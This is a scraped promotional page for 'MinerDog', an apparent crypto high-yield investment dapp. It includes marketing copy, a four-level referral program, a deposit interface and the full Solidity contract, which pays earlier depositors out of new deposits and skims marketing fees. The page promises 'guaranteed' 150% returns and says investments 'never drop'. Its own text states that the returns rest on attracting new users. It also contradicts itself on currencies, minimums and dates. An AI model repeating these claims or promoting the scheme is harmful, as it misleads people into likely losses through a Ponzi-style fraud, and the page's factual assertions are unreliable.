@@ -1,0 +1,601 @@
+SmartWeb3
+Current platform balance in
+:
+4686371.4310
+Current Platform Profit - 6.80 %
+Next Change To 7.65%
+In 5000000 USDT
+Check Contract
+Select language
+Menu
+About Us
+MinerDog Investment Plans
+Ask Us Questions
+Make Investment
+Promote Us
+Connect Wallet
+MinerDog
+As the industry's pioneering and Verified-Audited Investment code, our solution is designed to prove that MinerDog contracts are the future of investments. The longevity and stability of MinerDog Inu will ultimately disrupt the crypto industry and how people perceive investments and trading. The regular token industry faces many challenges, including token scams, rugs, market volatility, dishonest developers who steal users’ funds, and lack of liquidity.
+6.80%
+Current Daily Profit - 6.80%
+Additional +0.05% bonus for every 45
+on a MinerDog Contract Balance
+0
+Interest Calculator
+Earning in Real Time
+Daily Profit When Started
+3.00 %
+Current Profit Per Day
+6.80%
+Maximum Profit Per Day
+Contract Limit 7.00% Daily
+Personal Hold Bonus Limit
+1.00%
+100
+Deposit Amount
+6.80
+%
+Current Profit
+0.98
+Currently Hourly Profit
+150
+Total Profit
+150.00 %
+Total Maximal Return
+Get Started Now
+Audited By Haze Security Team.
+Independat MinerDog Auditor
+Check Audit
+MinerDog LIMITED - Registered Company
+MinerDog website is DDoS protected By the best Leader in the Industry against the DDoS Attacks
+Check Company
+Hold Bonus is limited to 1%
+Total and it gives extra 0.1% For Every Day
+you hold your Balance without WD
+Total Platforms Return for the Investment period is 150%
+, which Guaranteed LONG and STABLE Income
+Total Daily Profit Is Limited to 8%
+, from which 1%
+Is Total Hold Bonus and 7% Daily Profit
+Daily Profit Increases for 0.05% every time
+MinerDog Balance gets a 45
+and % doesnt fall when Balance decreases.
+Hold Bonus doesnt decrease after you make another Investment
+Why
+Earn With MinerDog
+About MinerDog
+MinerDog is a registered company in the UK (MinerDog LTD) under the registration number - 14871317. We are the ONLY audited and verified MinerDog contract investment website in the cryptocurrency space running on the Binance MinerDog Chain (BSC) network. As a user, you can join and try out this new crypto product with a very minimal investment of 0.01 BNB.
+MinerDog is an innovative platform built by industry professionals with years of experience dealing with MinerDog contracts. Our solution is community-driven; hence, the users control the project with no false promises from the team and no useless roadmaps. Everything on the platform is designed with a longevity focus and transparency; hence no space for token scams and rugs within our ecosystem
+Referral Program
+We have 4 Level Referral commissions. First Level 5%, Second Level 2%, Third and Forth Leve 0.5%. MinerDog Referral Program is the leading program in the Binance MinerDog Chain ecosystem. Our target users are promoters and industry leaders who earn money by referrals. Our platform features detailed statistics such as When and Who joins under you-including the timestamp of the referred user join date.
+To join, start referring and earn with MinerDog, you need to deposit a minimum of 0.01 BNB to facilitate registration on the MinerDog contract system. We have plenty of banners under the promo section. You can make videos, invite family and friends, share your referral link online to build your advertising network. Commissions are paid instantly upon request on the platform.
+85%
+Main Contract Balance,Investor Payouts
+Main Contract Balance,Investor Payouts
+85%
+Referral Commissions
+8%
+For Marketing
+7%
+Solidity Code
+pragma solidity 0.5.9;
+contract MinerDog {
+using SafeMath for uint256;
+uint256 constant public MinimumInvest = 10**18/100;
+uint256 constant public MarketingFee = 700;
+uint256[] public ReferralCommissions = [500, 200, 50, 50];
+uint256 constant public Day = 1 days;
+uint256 constant public ROICap = 15000;
+uint256 constant public PercentDiv = 10000;
+uint256 constant public ContractIncreaseEach = 45 * 10**18;
+uint256 constant public StartBonus = 200;
+uint256 constant public ContractBonusCap = 700;
+uint256 constant public HoldBonusCap = 100;
+uint256 public TotalInvestors;
+uint256 public TotalInvested;
+uint256 public TotalWithdrawn;
+uint256 public TotalDepositCount;
+uint256 public CurrentBonus;
+address payable public MarketingFeeAddress;
+struct Deposit {
+uint256 amount;
+uint256 withdrawn;
+uint256 start;
+}
+struct Commissions {
+address Downline;
+uint256 Earned;
+uint256 Invested;
+uint256 Level;
+uint256 DepositTime;
+}
+struct User {
+Deposit[] deposits;
+Commissions[] commissions;
+uint256 checkpoint;
+address upline;
+uint256 totalinvested;
+uint256 totalwithdrawn;
+uint256 totalcommisions;
+uint256 lvlonecommisions;
+uint256 lvltwocommisions;
+uint256 lvlthreecommisions;
+uint256 lvlfourcommisions;
+uint256 availablecommisions;
+}
+mapping (address =>User)   internal users;
+event ReferralBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
+event NewDeposit(address indexed user, uint256 amount);
+event Withdrawal(address indexed user, uint256 amount);
+constructor(address payable MarketingAddress) public {
+require(!isContract(MarketingAddress));
+MarketingFeeAddress = MarketingAddress;
+CurrentBonus = StartBonus;
+}
+function Invest(address InvestorUpline) public payable {
+require(msg.value >= MinimumInvest);
+MarketingFeeAddress.transfer(msg.value.mul(MarketingFee).div(PercentDiv));
+User storage user = users[msg.sender];
+if (user.upline == address(0) &&users[InvestorUpline].deposits.length >0 &&InvestorUpline != msg.sender) {
+user.upline = InvestorUpline;
+}
+if (user.upline != address(0)) {
+address upline = user.upline;
+for (uint256 i = 0; i <4; i++) {
+if (upline != address(0)) {
+uint256 amount = msg.value.mul(ReferralCommissions[i]).div(PercentDiv);
+users[upline].totalcommisions = users[upline].totalcommisions.add(amount);
+users[upline].availablecommisions = users[upline].availablecommisions.add(amount);
+if(i == 0){
+users[upline].lvlonecommisions = users[upline].lvlonecommisions.add(amount);
+}
+if(i == 1){
+users[upline].lvltwocommisions = users[upline].lvltwocommisions.add(amount);
+}
+if(i == 2){
+users[upline].lvlthreecommisions = users[upline].lvlthreecommisions.add(amount);
+}
+if(i == 3){
+users[upline].lvlfourcommisions = users[upline].lvlfourcommisions.add(amount);
+}
+users[upline].commissions.push(Commissions(msg.sender, amount, msg.value, i, block.timestamp));
+emit ReferralBonus(upline, msg.sender, i, amount);
+upline = users[upline].upline;
+} else break;
+}
+}
+if (user.upline == address(0)) {
+uint256 advertise = 800;
+MarketingFeeAddress.transfer(msg.value.mul(advertise).div(PercentDiv));
+}
+if (user.deposits.length == 0) {
+user.checkpoint = block.timestamp;
+TotalInvestors = TotalInvestors.add(1);
+}
+user.deposits.push(Deposit(msg.value, 0, block.timestamp));
+user.totalinvested = user.totalinvested.add(msg.value);
+TotalDepositCount = TotalDepositCount.add(1);
+TotalInvested = TotalInvested.add(msg.value);
+UpdateContractBonus();
+emit NewDeposit(msg.sender, msg.value);
+}
+function WithdrawCommissions() public {
+User storage user = users[msg.sender];
+uint256 contractBalance = address(this).balance;
+uint256 toSend;
+require(user.availablecommisions >0, "No commissions available");
+if (contractBalance <user.availablecommisions) {
+toSend = contractBalance;
+user.availablecommisions = user.availablecommisions.sub(toSend);
+}else{
+toSend = user.availablecommisions;
+user.availablecommisions = 0;
+}
+msg.sender.transfer(toSend);
+TotalWithdrawn = TotalWithdrawn.add(toSend);
+emit Withdrawal(msg.sender, toSend);
+}
+function WithdrawDividends() public {
+User storage user = users[msg.sender];
+uint256 userPercentRate = CurrentBonus.add(GetHoldBonus(msg.sender));
+uint256 toSend;
+uint256 dividends;
+uint256 ResetHoldBonus;
+for (uint256 i = 0; i <user.deposits.length; i++) {
+if (user.deposits[i].withdrawn <((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
+if (user.deposits[i].start >user.checkpoint) {
+dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
+.mul(block.timestamp.sub(user.deposits[i].start))
+.div(Day);
+ResetHoldBonus = ResetHoldBonus.add(1);
+} else {
+dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
+.mul(block.timestamp.sub(user.checkpoint))
+.div(Day);
+ResetHoldBonus = ResetHoldBonus.add(1);
+}
+if (user.deposits[i].withdrawn.add(dividends) >= ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
+dividends = (((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))).sub(user.deposits[i].withdrawn);
+ResetHoldBonus = 0;
+}
+user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);
+toSend = toSend.add(dividends);
+}
+}
+require(toSend >0, "No dividends available");
+uint256 contractBalance = address(this).balance;
+if (contractBalance <toSend) {
+toSend = contractBalance;
+}
+if(ResetHoldBonus != 0){
+user.checkpoint = block.timestamp;
+}
+msg.sender.transfer(toSend);
+TotalWithdrawn = TotalWithdrawn.add(toSend);
+user.totalwithdrawn = user.totalwithdrawn.add(toSend);
+emit Withdrawal(msg.sender, toSend);
+}
+function GetUserDividends(address userAddress) public view returns (uint256) {
+User storage user = users[userAddress];
+uint256 userPercentRate = CurrentBonus.add(GetHoldBonus(msg.sender));
+uint256 totalDividends;
+uint256 dividends;
+for (uint256 i = 0; i <user.deposits.length; i++) {
+if (user.deposits[i].withdrawn <((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
+if (user.deposits[i].start >user.checkpoint) {
+dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
+.mul(block.timestamp.sub(user.deposits[i].start))
+.div(Day);
+} else {
+dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
+.mul(block.timestamp.sub(user.checkpoint))
+.div(Day);
+}
+if (user.deposits[i].withdrawn.add(dividends) >((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
+dividends = ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv)).sub(user.deposits[i].withdrawn);
+}
+totalDividends = totalDividends.add(dividends);
+}
+}
+return totalDividends;
+}
+function ActiveClient(address userAddress) public view returns (bool) {
+User storage user = users[userAddress];
+if (user.deposits.length >0) {
+if (user.deposits[user.deposits.length-1].withdrawn <((user.deposits[user.deposits.length-1].amount.mul(ROICap)).div(PercentDiv))) {
+return true;
+}
+}
+}
+function UpdateContractBonus() internal {
+uint256 contractBalancePercent = (TotalInvested.div(ContractIncreaseEach)).mul(5);
+if(contractBalancePercent >ContractBonusCap){
+contractBalancePercent = ContractBonusCap;
+}
+CurrentBonus = StartBonus.add(contractBalancePercent);
+}
+function GetHoldBonus(address userAddress) public view returns (uint256) {
+User storage user = users[userAddress];
+if (user.checkpoint >0) {
+uint256 timeMultiplier = ((now.sub(user.checkpoint)).div(Day)).mul(10);
+if(timeMultiplier >HoldBonusCap){
+timeMultiplier = HoldBonusCap;
+}
+return timeMultiplier;
+}else{
+return 0;
+}
+}
+function GetTotalCommission(address userAddress) public view returns(uint256) {
+User storage user = users[userAddress];
+return (user.commissions.length);
+}
+function GetUserCommission(address userAddress, uint256 index) public view returns(address, uint256, uint256, uint256, uint256) {
+User storage user = users[userAddress];
+return (user.commissions[index].Downline, user.commissions[index].Earned, user.commissions[index].Invested, user.commissions[index].Level, user.commissions[index].DepositTime);
+}
+function GetUserData(address userAddress) public view returns(address, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
+User storage user = users[userAddress];
+return (user.upline, user.totalinvested, user.totalwithdrawn, user.totalcommisions, user.lvlonecommisions, user.lvltwocommisions, user.lvlthreecommisions, user.lvlfourcommisions, user.availablecommisions, user.checkpoint);
+}
+function GetUserTotalDeposits(address userAddress) public view returns(uint256) {
+return users[userAddress].deposits.length;
+}
+function GetUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
+User storage user = users[userAddress];
+return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
+}
+function GetContractBalance() public view returns (uint256) {
+return address(this).balance;
+}
+function isContract(address addr) internal view returns (bool) {
+uint size;
+assembly { size := extcodesize(addr) }
+return size >0;
+}
+}
+library SafeMath {
+function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {
+return div(mul(a, b), base);
+}
+function add(uint256 a, uint256 b) internal pure returns (uint256) {
+uint256 c = a + b;
+require(c >= a, "SafeMath: addition overflow");
+return c;
+}
+function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+require(b <= a, "SafeMath: subtraction overflow");
+uint256 c = a - b;
+return c;
+}
+function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+if (a == 0) {
+return 0;
+}
+uint256 c = a * b;
+require(c / a == b, "SafeMath: multiplication overflow");
+return c;
+}
+function div(uint256 a, uint256 b) internal pure returns (uint256) {
+require(b >0, "SafeMath: division by zero");
+uint256 c = a / b;
+return c;
+}
+}
+MinerDog
+Video Presentation
+Play Video
+The MinerDog solution is not in any way affected by these and many other challenges witnessed in the crypto industry due to the solution-based structure. Our platform does not require market liquidity. Hence, your investments and expected incomes are safe because we are not dependent on changes in the industry. Instead, we've built a solution based on the attraction of new users but running on a MinerDog contract! Our code and structure are safe with guaranteed longevity and transparency. Therefore, we have a very attractive and robust referral program with detailed and transparent statistics for each promoter/user. Earnings for promoters as well as other user's incomes are added to profiles in real-time, and unlike other DeFi investment solutions, one can withdraw their funds instantly and at any time.
+How it
+Works
+Our solution is a computerized transaction protocol that automatically implements the terms of a contract between two parties. Similar to the common contract, both users in our platform will have to define the rules and terms of engagement while transacting. Upon agreement and initiation of the MinerDog contract, it runs as designed with zero chance of orchestrating an alterationto pre-determined conditions. Initiating activities on MinerDog, users must have a balance available on the contract (minimum 100 USDT). The rest users leave it to the contract to implement with no more long sitting hours tocheck when to sell or buy. Therefore, as per contract terms, it ensures your Investment value never drops; instead, it delivers to our users 100 percent profits.
+6.80%
+Current Daily
+Total Return 150.00%
+Current Profit (Profit 0.28% Per Hour)
+Personal Hold-Bonus:
++0.1% Per 24 Hours
+Max 1%
+Without Withdrawal
+Total Profit:
+150%
+(Deposit Included)
+Minimum Deposit:
+100
+Maximum Deposit
+Unlimited
+Earnings in realtime
+Withdraw anytime
+How To Make Deposit
+?
+1
+Make Deposit
+GET
+HOW TO GET
+JOIN NODE
+TO OUR MinerDog
+Connect
+Agree to connect
+Node connection:
+Minimal deposit amount is 100
+2
+Request Withdraw
+Your Payout Will Come Instantly
+Request Withdraw From The Same Wallet You Deposited
+Your
+wallet address:
+Your Wallet
+WALLET STATISTICS
+Withdraw Money
+Connect With Your Wallet App
+Connect Wallet
+© 2024 MinerDog
+MinerDog Address:
+0xad0d6f704...536973eb4
+Check Audit
+CONTACT US
+English
+English
+Chinese
+Reserve Domains
+MinerDog
+Wallet Statistics
+Here you will be able to view all your wallet statistics including investment portfolio, profits, held bonuses, and contract balance bonuses. Through this interface, you can make withdrawals, investments, and many more.
+This is your BNB Wallet Address
+Make Deposit
+Available Withdraw Balance:
+0
+$ 0.00
+Withdraw
++0.0
+%
+i
+Your current Daily Profit
+Your Current Daily Profit
++2.0 %
+i
+Basic Contract profit
+Basic Profit
++0.0
+%
+i
+The longer you are holding balance without withdrawing, the more daily % you will receive.
+Hold-Bonus
++0.0
+%
+i
+Contract balance Bonus
+Contract Bonus
+Additional +0.05% bonus for every 45 BNB on a MinerDog Balance
+Total Invested:
+0.00
+Number of deposits:
+0
+Last deposit date:
+-
+Total earned:
+0.00
+Total withdrawn:
+0.00
+Referral Statistics
+This window gives you access to detailed information relating to your referral statistics. You can view Your Upline, Referral Link (active after a minimum deposit of 0.01 BNB, All the Rewards in All 4 Levels. MinerDog is the only platform giving you access to such detailed referral statistics! Refer to as many users as you can and enjoy massive earnings on this wonderful platform.
+Your Referral Link
+Upline
+i
+This is your Upline Wallet Address
+You Need Active Deposit To Unlock Referrals
+PROMO MATERIALS
+Rewards
+Available Referral Commission
+0
+i
+Your Available Referral commission balance, Withdrawable separately from Your deposit profit balance, it will not affect the Hold Bonus after Withdrawal.
+Withdraw Commission
+Total Earned Commission
+0
+Total Withdraw Commission
+0
+1st Referral Level:
+Active Referrals: 0
+i
+Your active referrals
+Check Referrals
+2nd Referral Level:
+Active Referrals: 0
+i
+Your active referrals
+Check Referrals
+3rd Referral Level:
+Active Referrals: 0
+i
+Your active referrals
+Check Referrals
+4th Referral Level:
+Active Referrals: 0
+i
+Your active referrals
+Check Referrals
+Make Deposit
+Minimal deposit amount is 100
+IMPORTANT:
+Do not forget about
+fee! You should have 0.004
+more on your wallet, or your transaction will get out of energy status!
+Minimal Deposit Amount: 100
+(No Maximal Limits)
+We Are Working Only With
+Cryptocurrency
+Your Deposit Will Be Activated After 1 Confirmation In
+Earnings Comes Every Moment On Your Wallet Balance, You Can Withdraw It Any Time You Want
+Make Deposit
+Successfully Deposit
+We have received your Deposit. Now you can start attracting new members with your referral link and earn extra.
+1
+Your Deposit
+5.10
+%
+Contract Profit Now
+?
+How To Get
+?
+You can easily acquire
+from most popular cryptocurrency exchange platforms, like Binance, Poloniex, Bitfinex, OKEx, etc.
+After purchasing
+, you can transfer it to your personal wallet, and then transfer it to our MinerDog address.
+Binance
+Poloniex
+IMPORTANT:
+We are only working with personal wallets. Please don’t make deposits directly fromthe exchange platforms. If you do so, the payouts will be made to the exchange platform and not to your account - you will lose funds. As such, whenever you want to send
+payments to our MinerDog address, please route it through your personal wallet.
+?
+Which
+Personal Wallets To Use?
+You can use two types of wallets:
+Browser Extensions, Like Metamask or Trustwallet:
+Install The Extension On Your Favorite Browser And Create A Personal Wallet Address.
+Mobile Crypto Wallets:
+Use Any Personal Crypto Wallet That Supports
+Cryptocurrency And
+Dapps» Technology, Like TrustWallet, Metamaks, And Others.
+PROMO MATERIALS
+Your Referral Link
+i
+Once The
+MinerDog Is Published On The
+, It Can’t Be Modified By Any Individual Or Administrative Body. Participants Can Rest Assured That Their Funds Are Perfectly Secure.
+You Need Active Deposit To Unlock Referrals
+Select Size
+120x60
+320x100
+336x280
+468x60
+728x90
+970x90
+970x250
+View Banner
+Copy Code
+Back
+Total: 300
+Your Active LVL
+Referral Level
+Invested:
+0
+Earned:
+0
+Subscribe To Newsletter
+Subscribe to our newsletter to get updates on the Contests, Airdrops and many more!
+Are you sure you would like to Withdraw all commissions?
+Yes
+Cancel
+Are you sure you would like to Withdraw all dividends?
+Yes
+Cancel
+Weekly Referral contest!
+Starting From
+From 29.09.2021 - 11:00 AM - 06.10.2021 - 15:00 PM EST
+MinerDog the best MinerDog Contract platform, is happy to announce our first referral contest with a grand prize worth US$2500!
+paid in BNB.
+Contest Rules
+Our referral contest’s rules are simple. Refer our platform to new users and ensure they make an Investment. The MinerDog users with the greatest number of active referrals will win the contest.
+Contest Description
+According to the contest’s rules, you have to refer the MinerDog platform to as many new users as possible, and encourage them to Invest. Towards the end of the contest, we will award 10 lucky participants in the Referral Rewards Program. We welcome participants from across the globe. There’s no need to apply for the contest — all you have to do is start referring. Everyone with active referrals will automatically be eligible for the grand prize.
+How to Enter?
+Make sure that you have a minimum of 0.01 BNB Invested in order to activate referral link. Post in on telegram groups, social media, send it to friends, make a Youtube video, make sure that you are getting active referrals.
+Referrals Will be counted only from 1st level referral Investments
+Winner Section
+In this section you can see top 10 addresses with the most referrals counted from the contest launch date - 29.09.2021 - 11:00 AM - Till - 06.10.2021 - 15:00 PM EST
+You can use your referral link in the
+Wallet Section
+We have also many banner sizes available here
+Promo
+Top 10 Referral addresses
+1St Place
+address…
+New Active referrals 24
+2nd Place
+address…
+New Active referrals 24
+3rd Place
+address…
+New Active referrals 24
+4th Place
+address…
+New Active referrals 24
+5th Place
+address…
+New Active referrals 24
+6th Place
+address…
+New Active referrals 24
+7th Place
+address…
+New Active referrals 24
+8th Place
+address…
+New Active referrals 24
+9th Place
+address…
+New Active referrals 24
+10th Place
+address…
+New Active referrals 24
